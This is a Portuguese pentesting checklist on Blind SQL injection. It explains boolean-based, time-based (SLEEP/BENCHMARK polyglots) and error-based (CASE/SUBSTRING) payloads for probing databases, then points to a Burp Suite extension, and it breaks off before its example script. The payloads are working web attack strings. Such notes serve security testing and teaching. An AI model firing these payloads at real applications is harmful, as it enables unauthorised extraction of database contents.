Basicamente uma aplicação é vulnerável a Blind SQL Injection quando não retorna nenhum resultado como resposta aos códigos SQL injetados. Neste cenário, códigos contendo UNION não são efetivos, e é necessário usar códigos condicionais para extrair informações da base de dados. 

:fries:Checklist

- Boolean-based Blind SQLi
<p>Se a aplicação mudar a resposta ao enviar uma sentença falsa, isso é um indício de que a aplicação está vulnerável.</p>

```
' AND 1=1 -- - (true)
' AND 1=2 -- - (false)
```
- Time-based Blind SQLi
<p>Códigos com 'SLEEP' ou 'BENCHMARCK' forçam a base de dados a esperar 10 segundos quando a condição é verdadeira. Se a resposta tiver um delay de 10 segundos (ou outro valor adicionado ao comando), isso indica que o payload funcionou, e a aplicação está vulnerável. </p>

```
/* Multicontext */
SLEEP(10)
SLEEP(10) /*' or SLEEP(10) or '" or SLEEP(10) or "*/

/* MySQL only */
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```
- Error-based Blind SQLi
<p>Apesar do Blind SQL Injection não retornar uma mensagem de erro convencional, quando usamos CASE para testar uma condição, podemos obter o retorno de "strings", e fazer o mapeamento de informações a partir dessa resposta. </p>

```
 ' OR (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT database()),1,1)) = 'a') THEN CAST('' AS INT) ELSE 'a' END) -- ';
 
 select substring(database(),1,1)
 
 ' and substring(@@version,1,1)='[valor-para-testar]
```
### Burp Suite to exploit Blind SQLi
Instale a extensão "Copy as Python-Requests" do Burp Suite e use a requisição para realizar a exploração do Blind SQL Injection. Script de exemplo: 

